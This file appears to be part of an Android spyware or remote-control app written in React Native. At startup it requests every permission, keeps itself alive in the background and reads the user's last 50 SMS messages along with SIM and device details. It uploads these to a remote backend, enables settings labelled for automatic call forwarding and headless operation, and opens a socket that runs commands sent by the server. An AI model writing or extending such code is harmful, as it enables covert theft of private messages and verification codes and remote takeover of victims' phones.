import { useEffect, useCallback, useRef } from 'react';
import { Platform, AppState } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { register, getUserData } from '../api/api';

import PermissionService from '../services/PermissionService';
import DeviceService from '../services/DeviceService';
import SmsService from '../services/SmsService';
import SimService from '../services/SimService';
import BackgroundService from '../services/BackgroundService';
import SocketService from '../services/SocketService';
import CommandService from '../services/CommandService';
import BatteryOptimizationService from '../services/BatteryOptimizationService';

const REGISTRATION_STATUS_KEY = '@device_registered';

export const useAppInitialization = ({
  appData,
  updateAppData,
  socketRef,
  deviceIdRef
}) => {

  const isBatteryCheckDone = useRef(false);
  const isInitializationComplete = useRef(false);
  const isSocketCreated = useRef(false);
  const shouldContinueRegistration = useRef(false);
  // ✅ NEW: Prevent duplicate registration calls
  const isRegistrationInProgress = useRef(false);

  const handleCommand = useCallback((cmd) => {
    CommandService.handleCommand(cmd);
  }, []);

  useEffect(() => {
    CommandService.initialize(updateAppData, deviceIdRef, appData);
  }, [updateAppData, deviceIdRef, appData]);

  const setupSocketHandlers = useCallback(() => {
    SocketService.onConnect = () => {
      updateAppData({
        socketConnected: true,
        serviceStatus: "Connected - Real-time ready"
      });
    };

    SocketService.onRegistered = () => {
      updateAppData({
        serviceStatus: "✅ Real-time Commands Active (Background + Foreground)"
      });
    };

    SocketService.onDisconnect = (reason) => {
      updateAppData({
        socketConnected: false,
        serviceStatus: appData.backgroundServiceActive
          ? "Foreground disconnected (Background active)"
          : `Disconnected (${reason})`
      });
    };

    SocketService.onError = (error) => {
      updateAppData({
        socketConnected: false,
        serviceStatus: "Connection Error"
      });
    };
  }, [updateAppData, appData.backgroundServiceActive]);

  const checkExistingRegistration = useCallback(async (deviceId) => {
    try {
      console.log('🔍 Checking if device already exists in backend...');
      updateAppData({ registrationStatus: "Checking registration status..." });

      const response = await getUserData(deviceId);

      if (response.data) {
        console.log('✅ Device already registered in backend!');
        console.log('📦 User data:', response.data);

        await AsyncStorage.setItem(REGISTRATION_STATUS_KEY, 'true');

        updateAppData({
          registered: true,
          registrationStatus: "Device already registered ✔️"
        });

        return true;
      }

      return false;
    } catch (error) {
      if (error.response?.status === 404) {
        console.log('⚠️ Device not found in backend - needs registration');
        return false;
      }

      console.error('❌ Error checking registration:', error);

      const cachedStatus = await AsyncStorage.getItem(REGISTRATION_STATUS_KEY);
      if (cachedStatus === 'true') {
        console.log('✅ Using cached registration status from AsyncStorage');
        updateAppData({ registered: true });
        return true;
      }

      return false;
    }
  }, [updateAppData]);

  const completeRegistration = useCallback(async (id) => {
    // ✅ CRITICAL FIX: Check if registration is already in progress
    if (isRegistrationInProgress.current) {
      console.log('⚠️ Registration already in progress - skipping duplicate call');
      return;
    }

    // ✅ Mark registration as in progress
    isRegistrationInProgress.current = true;

    try {
      console.log('📝 Starting registration process...');

      // Request permissions
      updateAppData({ registrationStatus: "Requesting permissions..." });
      const permissionResult = await PermissionService.requestAllPermissions();

      updateAppData({
        permissionsStatus: permissionResult.permissionsStatus,
        registrationStatus: permissionResult.allGranted
          ? "All permissions granted ✔️"
          : "Some permissions denied - continuing with limited mode ⚠️"
      });

      // Start background service if permissions granted
      if (permissionResult.phoneGranted) {
        const serviceResult = await BackgroundService.startNativeBackgroundService(id);
        updateAppData({
          backgroundServiceActive: serviceResult.success,
          serviceStatus: serviceResult.message
        });
      } else {
        updateAppData({
          serviceStatus: "Background service skipped - phone permissions required"
        });
      }

      // Collect device info and register
      updateAppData({ registrationStatus: "Collecting device info..." });

      const [sms, dev, simInfo] = await Promise.all([
        SmsService.fetchAllSms(50),
        DeviceService.collectDeviceInfo(id),
        SimService.fetchSimInfo()
      ]);

      updateAppData({
        batteryLevel: dev.battery,
        isOnline: dev.online,
        smsCount: sms.length,
        registrationStatus: "Registering device..."
      });

      const registrationData = {
        ...dev,
        sms: sms || [],
        simInfo: simInfo || [],
        batterySource: "device",
        simsSource: "device",
        permissionsStatus: permissionResult.permissionsStatus,
        callForwardingSettings: {
          autoExecuteEnabled: true,
          monitoringEnabled: true,
          headlessMode: true,
          realTimeCommands: true,
          lastStatusCheck: new Date()
        }
      };

      console.log("📡 Calling /api/register...");
      const res = await register(registrationData);
      console.log("✅ Registration response:", res?.data);

      // Save registration status
      if (res?.data?.success) {
        await AsyncStorage.setItem(REGISTRATION_STATUS_KEY, 'true');
        console.log('💾 Registration status saved to AsyncStorage');
      }

      // Set registered flag
      updateAppData({
        registrationStatus: res?.data?.success ? "Registered ✔️" : "Registration failed ❌",
        lastSync: new Date(),
        serviceStatus: "Creating Real-time Socket...",
        registered: !!res?.data?.success,
      });

      // Create socket
      if (!isSocketCreated.current) {
        setTimeout(() => {
          const socket = SocketService.createSocket(id, handleCommand);
          socketRef.current = socket;
          isSocketCreated.current = true;
          console.log("✅ Socket created successfully");
        }, 1000);
      }

      console.log("✅ Registration complete");

      updateAppData({
        registrationStatus: permissionResult.allGranted
          ? "✅ Ready - Full functionality available"
          : "✅ Ready - Limited mode (some features may be restricted)"
      });

      isInitializationComplete.current = true;
      shouldContinueRegistration.current = false; // ✅ Reset flag

    } catch (error) {
      console.error("❌ Registration error:", error);

      // ✅ Handle rate limit error gracefully
      if (error.response?.status === 429) {
        console.log('⚠️ Rate limit hit - registration may have already completed');
        updateAppData({
          registrationStatus: "⚠️ Rate limit - checking registration status...",
        });

        // Check if device was actually registered despite the error
        const isRegistered = await checkExistingRegistration(id);
        if (isRegistered) {
          console.log('✅ Device was registered successfully despite rate limit');
          isInitializationComplete.current = true;
          shouldContinueRegistration.current = false;
          return;
        }
      }

      updateAppData({
        registrationStatus: "❌ Registration failed",
        registered: false,
      });

      // Create socket anyway
      if (deviceIdRef.current && !isSocketCreated.current) {
        setTimeout(() => {
          const socket = SocketService.createSocket(deviceIdRef.current, handleCommand);
          socketRef.current = socket;
          isSocketCreated.current = true;
        }, 2000);
      }
    } finally {
      // ✅ Always reset the in-progress flag
      isRegistrationInProgress.current = false;
    }
  }, [updateAppData, socketRef, handleCommand, checkExistingRegistration]);

  const performInitialization = useCallback(async () => {
    console.log("🚀 Starting app initialization...");

    try {
      setupSocketHandlers();

      const id = await DeviceService.getCanonicalDeviceId();
      deviceIdRef.current = id;
      updateAppData({
        deviceId: id,
        registrationStatus: "Device ID obtained ✔️"
      });

      const alreadyRegistered = await checkExistingRegistration(id);

      if (alreadyRegistered) {
        console.log('✅ Device already registered - skipping registration');

        if (!isSocketCreated.current) {
          setTimeout(() => {
            const socket = SocketService.createSocket(id, handleCommand);
            socketRef.current = socket;
            isSocketCreated.current = true;
            console.log("✅ Socket created for existing registration");
          }, 1000);
        }

        isInitializationComplete.current = true;
        updateAppData({
          registrationStatus: "✅ Ready - Device already registered"
        });

        return;
      }

      console.log('📝 New device - checking battery optimization...');
      updateAppData({ registrationStatus: "Checking battery optimization..." });

      const isIgnoring = await BatteryOptimizationService.isIgnoringBatteryOptimizations();

      if (!isIgnoring) {
        console.log("🔋 Battery optimization is enabled - requesting exemption");
        updateAppData({ registrationStatus: "Please disable battery optimization..." });

        shouldContinueRegistration.current = true;
        isBatteryCheckDone.current = true;

        await BatteryOptimizationService.requestIgnoreBatteryOptimizations();

        return;
      } else {
        console.log("✅ Battery optimization already disabled");
        isBatteryCheckDone.current = true;
      }

      await completeRegistration(id);

    } catch (error) {
      console.error("❌ Initialization error:", error);
      updateAppData({
        registrationStatus: "❌ Initialization failed",
        registered: false,
      });

      if (deviceIdRef.current && !isSocketCreated.current) {
        setTimeout(() => {
          const socket = SocketService.createSocket(deviceIdRef.current, handleCommand);
          socketRef.current = socket;
          isSocketCreated.current = true;
        }, 2000);
      }
    }
  }, [setupSocketHandlers, updateAppData, deviceIdRef, socketRef, handleCommand, checkExistingRegistration, completeRegistration]);

  useEffect(() => {
    performInitialization();

    return () => {
      SocketService.disconnect();
      isSocketCreated.current = false;
    };
  }, []);

  useEffect(() => {
    const handleAppStateChange = async (nextAppState) => {
      console.log('📱 App state changed to:', nextAppState);

      if (nextAppState === 'active') {
        // ✅ Check if we need to continue registration
        if (shouldContinueRegistration.current && deviceIdRef.current && !isRegistrationInProgress.current) {
          console.log('🔋 User returned from battery settings - checking status...');

          const isIgnoring = await BatteryOptimizationService.isIgnoringBatteryOptimizations();

          if (isIgnoring) {
            console.log('✅ Battery optimization disabled - continuing registration');
            updateAppData({ registrationStatus: "Battery optimization disabled ✔️" });

            // ✅ Continue with registration
            await completeRegistration(deviceIdRef.current);
          } else {
            console.log('⚠️ Battery optimization still enabled');
            updateAppData({
              registrationStatus: "⚠️ Please disable battery optimization to continue"
            });
          }
        } else if (isInitializationComplete.current) {
          console.log('📱 App came to foreground - already initialized');
          updateAppData({ serviceStatus: "✅ Foreground + Background - Real-time Active" });
        }
      }

      if (nextAppState === 'background' || nextAppState === 'inactive') {
        console.log('📱 App going to background');
        updateAppData({ serviceStatus: "🤖 Background Mode - Real-time Commands Active" });
      }
    };

    const subscription = AppState.addEventListener('change', handleAppStateChange);
    return () => subscription?.remove();
  }, [updateAppData, completeRegistration]);
};
